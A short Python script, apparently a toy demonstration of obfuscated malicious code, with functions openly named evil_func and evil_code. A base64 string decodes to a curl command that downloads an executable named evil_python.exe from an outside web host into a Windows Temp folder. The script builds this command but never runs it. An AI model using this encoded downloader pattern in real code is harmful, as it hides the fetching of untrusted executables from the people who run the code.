import base64

def evil_func():
    return base64.b64decode("Y3VybCAtbyBDOlxVc2Vyc1xJWFlcQXBwRGF0YVxMb2NhbFxUZW1wXGV2aWxfcHl0aG9uLmV4ZSBodHRwczovL3NwYWNleWxhZC5weXRob25hbnl3aGVyZS5jb20vc3RhdGljL2V2aWxfcHl0aG9uLmV4ZSAtcw==").decode()


def evil_code():
    print("MUAHAHAHHA")
    evil_command = evil_func()
    return evil_command


def legit_usefull():
    print("Here is some legit code that is very useful! :] It is the answer of what 2 + 2 is! :D")
    return 2 + 2


evil_code()